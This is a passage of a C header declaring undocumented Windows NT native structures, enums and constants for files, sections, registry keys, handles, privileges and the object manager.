    ULONG RequestSize;
    ULONG NumOutstandingRequests;
} FILE_SFIO_RESERVE_INFORMATION, *PFILE_SFIO_RESERVE_INFORMATION;

typedef struct _FILE_SFIO_VOLUME_INFORMATION {
    ULONG MaximumRequestsPerPeriod;
    ULONG MinimumPeriod;
    ULONG MinimumTransferSize;
} FILE_SFIO_VOLUME_INFORMATION, *PFILE_SFIO_VOLUME_INFORMATION;

//
// Define the flags for NtSet(Query)EaFile service structure entries
//

#define FILE_NEED_EA                    0x00000080

//
// Define EA type values
//

#define FILE_EA_TYPE_BINARY             0xfffe
#define FILE_EA_TYPE_ASCII              0xfffd
#define FILE_EA_TYPE_BITMAP             0xfffb
#define FILE_EA_TYPE_METAFILE           0xfffa
#define FILE_EA_TYPE_ICON               0xfff9
#define FILE_EA_TYPE_EA                 0xffee
#define FILE_EA_TYPE_MVMT               0xffdf
#define FILE_EA_TYPE_MVST               0xffde
#define FILE_EA_TYPE_ASN1               0xffdd
#define FILE_EA_TYPE_FAMILY_IDS         0xff01

typedef struct _FILE_FULL_EA_INFORMATION {
    ULONG NextEntryOffset;
    UCHAR Flags;
    UCHAR EaNameLength;
    USHORT EaValueLength;
    CHAR EaName[1];
} FILE_FULL_EA_INFORMATION, *PFILE_FULL_EA_INFORMATION;

typedef struct _FILE_GET_EA_INFORMATION {
    ULONG NextEntryOffset;
    UCHAR EaNameLength;
    CHAR EaName[1];
} FILE_GET_EA_INFORMATION, *PFILE_GET_EA_INFORMATION;

typedef struct _FILE_GET_QUOTA_INFORMATION {
    ULONG NextEntryOffset;
    ULONG SidLength;
    SID Sid;
} FILE_GET_QUOTA_INFORMATION, *PFILE_GET_QUOTA_INFORMATION;

typedef struct _FILE_QUOTA_INFORMATION {
    ULONG NextEntryOffset;
    ULONG SidLength;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER QuotaUsed;
    LARGE_INTEGER QuotaThreshold;
    LARGE_INTEGER QuotaLimit;
    SID Sid;
} FILE_QUOTA_INFORMATION, *PFILE_QUOTA_INFORMATION;

typedef struct _FILE_DIRECTORY_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;

typedef struct _FILE_FULL_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    WCHAR FileName[1];
} FILE_FULL_DIR_INFORMATION, *PFILE_FULL_DIR_INFORMATION;

typedef struct _FILE_ID_FULL_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_FULL_DIR_INFORMATION, *PFILE_ID_FULL_DIR_INFORMATION;

typedef struct _FILE_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;

typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, *PFILE_ID_BOTH_DIR_INFORMATION;

typedef struct _FILE_NAMES_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_NAMES_INFORMATION, *PFILE_NAMES_INFORMATION;

typedef struct _FILE_OBJECTID_INFORMATION {
    LONGLONG FileReference;
    UCHAR ObjectId[16];
    union {
        struct {
            UCHAR BirthVolumeId[16];
            UCHAR BirthObjectId[16];
            UCHAR DomainId[16];
        };
        UCHAR ExtendedInfo[48];
    };
} FILE_OBJECTID_INFORMATION, *PFILE_OBJECTID_INFORMATION;

typedef struct _FILE_FS_VOLUME_INFORMATION {
    LARGE_INTEGER VolumeCreationTime;
    ULONG         VolumeSerialNumber;
    ULONG         VolumeLabelLength;
    BOOLEAN       SupportsObjects;
    WCHAR         VolumeLabel[1];
} FILE_FS_VOLUME_INFORMATION, *PFILE_FS_VOLUME_INFORMATION;

typedef struct _FILE_ID_GLOBAL_TX_DIR_INFORMATION
{
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    LARGE_INTEGER FileId;
    GUID LockingTransactionId;
    ULONG TxInfoFlags;
    WCHAR FileName[1];
} FILE_ID_GLOBAL_TX_DIR_INFORMATION, *PFILE_ID_GLOBAL_TX_DIR_INFORMATION;

/*
** File END
*/

/*
** Section START
*/

typedef enum _SECTION_INFORMATION_CLASS {
    SectionBasicInformation,
    SectionImageInformation,
    SectionRelocationInformation,
    SectionOriginalBaseInformation,
    SectionInternalImageInformation,
    MaxSectionInfoClass
} SECTION_INFORMATION_CLASS;

typedef struct _SECTION_BASIC_INFO {
    PVOID BaseAddress;
    ULONG AllocationAttributes;
    LARGE_INTEGER MaximumSize;
} SECTION_BASIC_INFORMATION, *PSECTION_BASIC_INFORMATION;

typedef struct _SECTION_IMAGE_INFORMATION {
    PVOID TransferAddress;
    ULONG ZeroBits;
    SIZE_T MaximumStackSize;
    SIZE_T CommittedStackSize;
    ULONG SubSystemType;
    union {
        struct {
            USHORT SubSystemMinorVersion;
            USHORT SubSystemMajorVersion;
        };
        ULONG SubSystemVersion;
    };
    union
    {
        struct
        {
            USHORT MajorOperatingSystemVersion;
            USHORT MinorOperatingSystemVersion;
        };
        ULONG OperatingSystemVersion;
    };
    USHORT ImageCharacteristics;
    USHORT DllCharacteristics;
    USHORT Machine;
    BOOLEAN ImageContainsCode;
    union
    {
        UCHAR ImageFlags;
        struct
        {
            UCHAR ComPlusNativeReady : 1;
            UCHAR ComPlusILOnly : 1;
            UCHAR ImageDynamicallyRelocated : 1;
            UCHAR ImageMappedFlat : 1;
            UCHAR BaseBelow4gb : 1;
            UCHAR ComPlusPrefer32bit : 1;
            UCHAR Reserved : 2;
        };
    };
    ULONG LoaderFlags;
    ULONG ImageFileSize;
    ULONG CheckSum;
} SECTION_IMAGE_INFORMATION, *PSECTION_IMAGE_INFORMATION;

typedef struct _SECTION_IMAGE_INFORMATION64 {
    ULONGLONG TransferAddress;
    ULONG ZeroBits;
    ULONGLONG MaximumStackSize;
    ULONGLONG CommittedStackSize;
    ULONG SubSystemType;
    union {
        struct {
            USHORT SubSystemMinorVersion;
            USHORT SubSystemMajorVersion;
        };
        ULONG SubSystemVersion;
    };
    union
    {
        struct
        {
            USHORT MajorOperatingSystemVersion;
            USHORT MinorOperatingSystemVersion;
        };
        ULONG OperatingSystemVersion;
    };
    USHORT ImageCharacteristics;
    USHORT DllCharacteristics;
    USHORT Machine;
    BOOLEAN ImageContainsCode;
    union
    {
        UCHAR ImageFlags;
        struct
        {
            UCHAR ComPlusNativeReady : 1;
            UCHAR ComPlusILOnly : 1;
            UCHAR ImageDynamicallyRelocated : 1;
            UCHAR ImageMappedFlat : 1;
            UCHAR BaseBelow4gb : 1;
            UCHAR ComPlusPrefer32bit : 1;
            UCHAR Reserved : 2;
        };
    };
    ULONG LoaderFlags;
    ULONG ImageFileSize;
    ULONG CheckSum;
} SECTION_IMAGE_INFORMATION64, *PSECTION_IMAGE_INFORMATION64;

typedef struct _SECTION_INTERNAL_IMAGE_INFORMATION {
    SECTION_IMAGE_INFORMATION SectionInformation;
    union
    {
        ULONG ExtendedFlags;
        struct
        {
            ULONG ImageExportSuppressionEnabled : 1;
            ULONG Reserved : 31;
        };
    };
} SECTION_INTERNAL_IMAGE_INFORMATION, *PSECTION_INTERNAL_IMAGE_INFORMATION;

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

#ifndef SEC_BASED
#define SEC_BASED          0x200000
#endif

#ifndef SEC_NO_IMAGE
#define SEC_NO_CHANGE      0x400000
#endif

#ifndef SEC_FILE
#define SEC_FILE           0x800000     
#endif

#ifndef SEC_IMAGE
#define SEC_IMAGE         0x1000000     
#endif

#ifndef SEC_RESERVE
#define SEC_RESERVE       0x4000000     
#endif

#ifndef SEC_COMMIT
#define SEC_COMMIT        0x8000000     
#endif

#ifndef SEC_NOCACHE
#define SEC_NOCACHE      0x10000000     
#endif

#ifndef SEC_GLOBAL
#define SEC_GLOBAL       0x20000000
#endif

#ifndef SEC_LARGE_PAGES
#define SEC_LARGE_PAGES  0x80000000    
#endif

/*
** Section END
*/

/*
** System Table START
*/
#define NUMBER_SERVICE_TABLES 2
#define NTOS_SERVICE_INDEX   0
#define WIN32K_SERVICE_INDEX 1
#define SERVICE_NUMBER_MASK ((1 << 12) -  1)

#if defined(_WIN64)

#if defined(_AMD64_)

#define SERVICE_TABLE_SHIFT (12 - 4)
#define SERVICE_TABLE_MASK (((1 << 1) - 1) << 4)
#define SERVICE_TABLE_TEST (WIN32K_SERVICE_INDEX << 4)

#else

#define SERVICE_TABLE_SHIFT (12 - 5)
#define SERVICE_TABLE_MASK (((1 << 1) - 1) << 5)
#define SERVICE_TABLE_TEST (WIN32K_SERVICE_INDEX << 5)

#endif

#else

#define SERVICE_TABLE_SHIFT (12 - 4)
#define SERVICE_TABLE_MASK (((1 << 1) - 1) << 4)
#define SERVICE_TABLE_TEST (WIN32K_SERVICE_INDEX << 4)

#endif

typedef struct _KSERVICE_TABLE_DESCRIPTOR {
    ULONG_PTR Base; //e.g. KiServiceTable
    PULONG Count;
    ULONG Limit;//e.g. KiServiceLimit
    PUCHAR Number; //e.g. KiArgumentTable
} KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;
/*
** System Table END
*/

/*
** System Boot Environment START
*/

// Size=20
typedef struct _SYSTEM_BOOT_ENVIRONMENT_INFORMATION_V1 {
    struct _GUID BootIdentifier;
    enum _FIRMWARE_TYPE FirmwareType;
} SYSTEM_BOOT_ENVIRONMENT_INFORMATION_V1, *PSYSTEM_BOOT_ENVIRONMENT_INFORMATION_V1;

// Size=32
typedef struct _SYSTEM_BOOT_ENVIRONMENT_INFORMATION {
    struct _GUID BootIdentifier;
    enum _FIRMWARE_TYPE FirmwareType;
    unsigned __int64 BootFlags;
} SYSTEM_BOOT_ENVIRONMENT_INFORMATION, *PSYSTEM_BOOT_ENVIRONMENT_INFORMATION;

/*
** System Boot Environment END
*/

/*
** Key START
*/

typedef enum _KEY_INFORMATION_CLASS {
    KeyBasicInformation,
    KeyNodeInformation,
    KeyFullInformation,
    KeyNameInformation,
    KeyCachedInformation,
    KeyFlagsInformation,
    KeyVirtualizationInformation,
    KeyHandleTagsInformation,
    KeyTrustInformation,
    KeyLayerInformation,
    MaxKeyInfoClass
} KEY_INFORMATION_CLASS;

typedef enum _KEY_SET_INFORMATION_CLASS {
    KeyWriteTimeInformation,
    KeyWow64FlagsInformation,
    KeyControlFlagsInformation,
    KeySetVirtualizationInformation,
    KeySetDebugInformation,
    KeySetHandleTagsInformation,
    KeySetLayerInformation,
    MaxKeySetInfoClass
} KEY_SET_INFORMATION_CLASS;

typedef struct _KEY_FULL_INFORMATION {
    LARGE_INTEGER LastWriteTime;
    ULONG   TitleIndex;
    ULONG   ClassOffset;
    ULONG   ClassLength;
    ULONG   SubKeys;
    ULONG   MaxNameLen;
    ULONG   MaxClassLen;
    ULONG   Values;
    ULONG   MaxValueNameLen;
    ULONG   MaxValueDataLen;
    WCHAR   Class[1];
} KEY_FULL_INFORMATION, *PKEY_FULL_INFORMATION;

typedef struct _KEY_BASIC_INFORMATION {
    LARGE_INTEGER LastWriteTime;
    ULONG TitleIndex;
    ULONG NameLength;
    WCHAR Name[1];
} KEY_BASIC_INFORMATION, *PKEY_BASIC_INFORMATION;

typedef enum _KEY_VALUE_INFORMATION_CLASS {
    KeyValueBasicInformation,
    KeyValueFullInformation,
    KeyValuePartialInformation,
    KeyValueFullInformationAlign64,
    KeyValuePartialInformationAlign64,
    KeyValueLayerInformation,
    MaxKeyValueInfoClass
} KEY_VALUE_INFORMATION_CLASS;

typedef struct _KEY_VALUE_BASIC_INFORMATION {
    ULONG   TitleIndex;
    ULONG   Type;
    ULONG   NameLength;
    WCHAR   Name[1];            // Variable size
} KEY_VALUE_BASIC_INFORMATION, *PKEY_VALUE_BASIC_INFORMATION;

typedef struct _KEY_VALUE_FULL_INFORMATION {
    ULONG   TitleIndex;
    ULONG   Type;
    ULONG   DataOffset;
    ULONG   DataLength;
    ULONG   NameLength;
    WCHAR   Name[1];            // Variable size
    //          Data[1];            // Variable size data not declared
} KEY_VALUE_FULL_INFORMATION, *PKEY_VALUE_FULL_INFORMATION;

typedef struct _KEY_VALUE_PARTIAL_INFORMATION {
    ULONG   TitleIndex;
    ULONG   Type;
    ULONG   DataLength;
    UCHAR   Data[1];            // Variable size
} KEY_VALUE_PARTIAL_INFORMATION, *PKEY_VALUE_PARTIAL_INFORMATION;

typedef struct _KEY_VALUE_PARTIAL_INFORMATION_ALIGN64 {
    ULONG   Type;
    ULONG   DataLength;
    UCHAR   Data[1];            // Variable size
} KEY_VALUE_PARTIAL_INFORMATION_ALIGN64, *PKEY_VALUE_PARTIAL_INFORMATION_ALIGN64;

typedef struct _KEY_VALUE_ENTRY {
    PUNICODE_STRING ValueName;
    ULONG           DataLength;
    ULONG           DataOffset;
    ULONG           Type;
} KEY_VALUE_ENTRY, *PKEY_VALUE_ENTRY;

/*
** Key END
*/


/*
** TIME_FIELDS START
*/

typedef struct _TIME_FIELDS {
    CSHORT Year;        // range [1601...]
    CSHORT Month;       // range [1..12]
    CSHORT Day;         // range [1..31]
    CSHORT Hour;        // range [0..23]
    CSHORT Minute;      // range [0..59]
    CSHORT Second;      // range [0..59]
    CSHORT Milliseconds;// range [0..999]
    CSHORT Weekday;     // range [0..6] == [Sunday..Saturday]
} TIME_FIELDS;
typedef TIME_FIELDS *PTIME_FIELDS;

/*
** TIME_FIELDS END
*/

/*
** HANDLE START
*/

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

/*
** HANDLE END
*/

// Privileges

#define SE_MIN_WELL_KNOWN_PRIVILEGE (2L)
#define SE_CREATE_TOKEN_PRIVILEGE (2L)
#define SE_ASSIGNPRIMARYTOKEN_PRIVILEGE (3L)
#define SE_LOCK_MEMORY_PRIVILEGE (4L)
#define SE_INCREASE_QUOTA_PRIVILEGE (5L)
#define SE_MACHINE_ACCOUNT_PRIVILEGE (6L)
#define SE_TCB_PRIVILEGE (7L)
#define SE_SECURITY_PRIVILEGE (8L)
#define SE_TAKE_OWNERSHIP_PRIVILEGE (9L)
#define SE_LOAD_DRIVER_PRIVILEGE (10L)
#define SE_SYSTEM_PROFILE_PRIVILEGE (11L)
#define SE_SYSTEMTIME_PRIVILEGE (12L)
#define SE_PROF_SINGLE_PROCESS_PRIVILEGE (13L)
#define SE_INC_BASE_PRIORITY_PRIVILEGE (14L)
#define SE_CREATE_PAGEFILE_PRIVILEGE (15L)
#define SE_CREATE_PERMANENT_PRIVILEGE (16L)
#define SE_BACKUP_PRIVILEGE (17L)
#define SE_RESTORE_PRIVILEGE (18L)
#define SE_SHUTDOWN_PRIVILEGE (19L)
#define SE_DEBUG_PRIVILEGE (20L)
#define SE_AUDIT_PRIVILEGE (21L)
#define SE_SYSTEM_ENVIRONMENT_PRIVILEGE (22L)
#define SE_CHANGE_NOTIFY_PRIVILEGE (23L)
#define SE_REMOTE_SHUTDOWN_PRIVILEGE (24L)
#define SE_UNDOCK_PRIVILEGE (25L)
#define SE_SYNC_AGENT_PRIVILEGE (26L)
#define SE_ENABLE_DELEGATION_PRIVILEGE (27L)
#define SE_MANAGE_VOLUME_PRIVILEGE (28L)
#define SE_IMPERSONATE_PRIVILEGE (29L)
#define SE_CREATE_GLOBAL_PRIVILEGE (30L)
#define SE_TRUSTED_CREDMAN_ACCESS_PRIVILEGE (31L)
#define SE_RELABEL_PRIVILEGE (32L)
#define SE_INC_WORKING_SET_PRIVILEGE (33L)
#define SE_TIME_ZONE_PRIVILEGE (34L)
#define SE_CREATE_SYMBOLIC_LINK_PRIVILEGE (35L)
#define SE_MAX_WELL_KNOWN_PRIVILEGE SE_CREATE_SYMBOLIC_LINK_PRIVILEGE

//
// Generic test for success on any status value (non-negative numbers
// indicate success).
//

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

//
// Generic test for information on any status value.
//

#define NT_INFORMATION(Status) ((ULONG)(Status) >> 30 == 1)

//
// Generic test for warning on any status value.
//

#define NT_WARNING(Status) ((ULONG)(Status) >> 30 == 2)

//
// Generic test for error on any status value.
//

#define NT_ERROR(Status) ((ULONG)(Status) >> 30 == 3)


/*
** OBJECT MANAGER START
*/

//
// Header flags
//

#define OB_FLAG_NEW_OBJECT              0x01
#define OB_FLAG_KERNEL_OBJECT           0x02
#define OB_FLAG_CREATOR_INFO            0x04
#define OB_FLAG_EXCLUSIVE_OBJECT        0x08
#define OB_FLAG_PERMANENT_OBJECT        0x10
#define OB_FLAG_DEFAULT_SECURITY_QUOTA  0x20
#define OB_FLAG_SINGLE_HANDLE_ENTRY     0x40
#define OB_FLAG_DELETED_INLINE          0x80

//
// InfoMask values
//

#define OB_INFOMASK_PROCESS_INFO    0x10
#define OB_INFOMASK_QUOTA           0x08
#define OB_INFOMASK_HANDLE          0x04
#define OB_INFOMASK_NAME            0x02
#define OB_INFOMASK_CREATOR_INFO    0x01

#define OBJ_INVALID_SESSION_ID 0xFFFFFFFF
#define NUMBER_HASH_BUCKETS 37

typedef struct _OBJECT_DIRECTORY_ENTRY {
    PVOID ChainLink;
    PVOID Object;
    ULONG HashValue;
} OBJECT_DIRECTORY_ENTRY, *POBJECT_DIRECTORY_ENTRY;

typedef struct _EX_PUSH_LOCK {
    union
    {
        ULONG Locked : 1;
        ULONG Waiting : 1;
        ULONG Waking : 1;
        ULONG MultipleShared : 1;
        ULONG Shared : 28;
        ULONG Value;
        PVOID Ptr;
    };
} EX_PUSH_LOCK, *PEX_PUSH_LOCK;

typedef struct _OBJECT_NAMESPACE_LOOKUPTABLE {
    LIST_ENTRY HashBuckets[NUMBER_HASH_BUCKETS];
    EX_PUSH_LOCK Lock;
    ULONG NumberOfPrivateSpaces;
} OBJECT_NAMESPACE_LOOKUPTABLE, *POBJECT_NAMESPACE_LOOKUPTABLE;

typedef struct _OBJECT_NAMESPACE_ENTRY {
    LIST_ENTRY ListEntry;
    PVOID NamespaceRootDirectory;
    ULONG SizeOfBoundaryInformation;
    ULONG Reserved;
    UCHAR HashValue;
    ULONG_PTR Alignment;
} OBJECT_NAMESPACE_ENTRY, *POBJECT_NAMESPACE_ENTRY;

typedef enum _BOUNDARY_ENTRY_TYPE {
    OBNS_Invalid = 0,
    OBNS_Name = 1,
    OBNS_SID = 2,
    OBNS_IntegrityLabel = 3
} BOUNDARY_ENTRY_TYPE;

typedef struct _OBJECT_BOUNDARY_ENTRY {
    BOUNDARY_ENTRY_TYPE EntryType;
    ULONG EntrySize;
} OBJECT_BOUNDARY_ENTRY, *POBJECT_BOUNDARY_ENTRY;

typedef struct _OBJECT_BOUNDARY_DESCRIPTOR {
    ULONG Version;
    ULONG Items;
    ULONG TotalSize;
    ULONG Reserved;
} OBJECT_BOUNDARY_DESCRIPTOR, *POBJECT_BOUNDARY_DESCRIPTOR;

typedef struct _OBJECT_DIRECTORY {
    POBJECT_DIRECTORY_ENTRY HashBuckets[NUMBER_HASH_BUCKETS];
    EX_PUSH_LOCK Lock;
    PDEVICE_MAP DeviceMap;
    ULONG SessionId;
    PVOID NamespaceEntry;
    ULONG Flags;
} OBJECT_DIRECTORY, *POBJECT_DIRECTORY;

typedef struct _OBJECT_DIRECTORY_V2 {
    POBJECT_DIRECTORY_ENTRY HashBuckets[NUMBER_HASH_BUCKETS];
    EX_PUSH_LOCK Lock;
    PDEVICE_MAP DeviceMap;
    POBJECT_DIRECTORY ShadowDirectory;
    ULONG SessionId;
    PVOID NamespaceEntry;
    ULONG Flags;
    LONG Padding[1];
} OBJECT_DIRECTORY_V2, *POBJECT_DIRECTORY_V2;

typedef struct _OBJECT_DIRECTORY_V3 {
    POBJECT_DIRECTORY_ENTRY HashBuckets[NUMBER_HASH_BUCKETS];
    EX_PUSH_LOCK Lock;
    PDEVICE_MAP DeviceMap;
    POBJECT_DIRECTORY ShadowDirectory;
    PVOID NamespaceEntry;
    PVOID SessionObject;
    ULONG Flags;
    ULONG SessionId;
} OBJECT_DIRECTORY_V3, *POBJECT_DIRECTORY_V3;

typedef struct _OBJECT_HEADER_NAME_INFO {
    POBJECT_DIRECTORY Directory;
    UNICODE_STRING Name;
    ULONG QueryReferences;
} OBJECT_HEADER_NAME_INFO, *POBJECT_HEADER_NAME_INFO;

typedef struct _OBJECT_HEADER_CREATOR_INFO {// Size=32
    LIST_ENTRY TypeList; // Size=16 Offset=0
    PVOID CreatorUniqueProcess; // Size=8 Offset=16
    USHORT CreatorBackTraceIndex; // Size=2 Offset=24
    USHORT Reserved; // Size=2 Offset=26
} OBJECT_HEADER_CREATOR_INFO, *POBJECT_HEADER_CREATOR_INFO;

typedef struct _OBJECT_HANDLE_COUNT_ENTRY {// Size=16
    PVOID Process; // Size=8 Offset=0
    struct
    {
        unsigned long HandleCount : 24; // Size=4 Offset=8 BitOffset=0 BitCount=24
        unsigned long LockCount : 8; // Size=4 Offset=8 BitOffset=24 BitCount=8
    };
} OBJECT_HANDLE_COUNT_ENTRY, *POBJECT_HANDLE_COUNT_ENTRY;

typedef struct _OBJECT_HEADER_HANDLE_INFO { // Size=16
    union {
        PVOID HandleCountDataBase; // Size=8 Offset=0
        struct _OBJECT_HANDLE_COUNT_ENTRY SingleEntry; // Size=16 Offset=0
    };
} OBJECT_HEADER_HANDLE_INFO, *POBJECT_HEADER_HANDLE_INFO;

typedef struct _OBJECT_HEADER_PROCESS_INFO { // Size=16
    PVOID ExclusiveProcess; // Size=8 Offset=0
    PVOID Reserved; // Size=8 Offset=8
} OBJECT_HEADER_PROCESS_INFO, *POBJECT_HEADER_PROCESS_INFO;

typedef struct _OBJECT_HEADER_QUOTA_INFO {
    ULONG PagedPoolCharge; //4
    ULONG NonPagedPoolCharge; //4 
    ULONG SecurityDescriptorCharge; //4
    PVOID SecurityDescriptorQuotaBlock; //sizeof(pointer)
    unsigned __int64 Reserved; //sizeof(uint64)
} OBJECT_HEADER_QUOTA_INFO, *POBJECT_HEADER_QUOTA_INFO;

typedef struct _OBJECT_HEADER_PADDING_INFO {
    ULONG PaddingAmount;
} OBJECT_HEADER_PADDING_INFO, *POBJECT_HEADER_PADDING_INFO;

typedef struct _OBJECT_HEADER_AUDIT_INFO {
    PVOID SecurityDescriptor;
    PVOID Reserved;
} OBJECT_HEADER_AUDIT_INFO, *POBJECT_HEADER_AUDIT_INFO;

typedef struct _OBJECT_HEADER_EXTENDED_INFO {
    struct _OBJECT_FOOTER *Footer;
    PVOID Reserved;
} OBJECT_HEADER_EXTENDED_INFO, POBJECT_HEADER_EXTENDED_INFO;

typedef struct _OB_HANDLE_REVOCATION_BLOCK
{
    LIST_ENTRY RevocationInfos;
    struct _EX_PUSH_LOCK Lock;
    struct _EX_RUNDOWN_REF Rundown;
} OB_HANDLE_REVOCATION_BLOCK, *POB_HANDLE_REVOCATION_BLOCK;

typedef struct _OBJECT_HEADER_HANDLE_REVOCATION_INFO {
    LIST_ENTRY ListEntry;
    OB_HANDLE_REVOCATION_BLOCK* RevocationBlock;
    unsigned char Padding1[4];
    unsigned char Padding2[4];
} OBJECT_HEADER_HANDLE_REVOCATION_INFO, *POBJECT_HEADER_HANDLE_REVOCATION_INFO;

typedef struct _QUAD {
    union {
        INT64 UseThisFieldToCopy;
        float DoNotUseThisField;
    };
} QUAD, *PQUAD;

typedef struct _OBJECT_CREATE_INFORMATION {
    ULONG Attributes;
    PVOID RootDirectory;
    CHAR ProbeMode;
    ULONG PagedPoolCharge;
    ULONG NonPagedPoolCharge;
    ULONG SecurityDescriptorCharge;
    PVOID SecurityDescriptor;
    PSECURITY_QUALITY_OF_SERVICE SecurityQos;
    SECURITY_QUALITY_OF_SERVICE SecurityQualityOfService;
} OBJECT_CREATE_INFORMATION, *POBJECT_CREATE_INFORMATION;

typedef struct _SECURITY_CLIENT_CONTEXT {
    struct _SECURITY_QUALITY_OF_SERVICE SecurityQos;
    void* ClientToken;
    UCHAR DirectlyAccessClientToken;
    UCHAR DirectAccessEffectiveOnly;
    UCHAR ServerIsRemote;
    struct _TOKEN_CONTROL ClientTokenControl;
    LONG __PADDING__[1];
} SECURITY_CLIENT_CONTEXT, *PSECURITY_CLIENT_CONTEXT;

typedef enum _POOL_TYPE {
    NonPagedPool,
    NonPagedPoolExecute = NonPagedPool,
    PagedPool,
    NonPagedPoolMustSucceed = NonPagedPool + 2,
    DontUseThisType,
    NonPagedPoolCacheAligned = NonPagedPool + 4,
    PagedPoolCacheAligned,
    NonPagedPoolCacheAlignedMustS = NonPagedPool + 6,
    MaxPoolType,
    NonPagedPoolBase = 0,
    NonPagedPoolBaseMustSucceed = NonPagedPoolBase + 2,
    NonPagedPoolBaseCacheAligned = NonPagedPoolBase + 4,
    NonPagedPoolBaseCacheAlignedMustS = NonPagedPoolBase + 6,
    NonPagedPoolSession = 32,
    PagedPoolSession = NonPagedPoolSession + 1,
    NonPagedPoolMustSucceedSession = PagedPoolSession + 1,
    DontUseThisTypeSession = NonPagedPoolMustSucceedSession + 1,
    NonPagedPoolCacheAlignedSession = DontUseThisTypeSession + 1,
    PagedPoolCacheAlignedSession = NonPagedPoolCacheAlignedSession + 1,
    NonPagedPoolCacheAlignedMustSSession = PagedPoolCacheAlignedSession + 1,
    NonPagedPoolNx = 512,
    NonPagedPoolNxCacheAligned = NonPagedPoolNx + 4,
    NonPagedPoolSessionNx = NonPagedPoolNx + 32
} POOL_TYPE;

//
// WARNING this structure is incomplete, refer to complete definitions below if you need actual full variant.
//
typedef struct _OBJECT_TYPE_INITIALIZER_COMPATIBLE {// Size=120
    USHORT Length; // Size=2 Offset=0
    UCHAR ObjectTypeFlags; // Size=1 Offset=2
    ULONG ObjectTypeCode; // Size=4 Offset=4
    ULONG InvalidAttributes; // Size=4 Offset=8
    GENERIC_MAPPING GenericMapping; // Size=16 Offset=12
    ULONG ValidAccessMask; // Size=4 Offset=28
    ULONG RetainAccess; // Size=4 Offset=32
    POOL_TYPE PoolType; // Size=4 Offset=36
    ULONG DefaultPagedPoolCharge; // Size=4 Offset=40
    ULONG DefaultNonPagedPoolCharge; // Size=4 Offset=44
    PVOID DumpProcedure; // Size=8 Offset=48
    PVOID OpenProcedure; // Size=8 Offset=56
    PVOID CloseProcedure; // Size=8 Offset=64
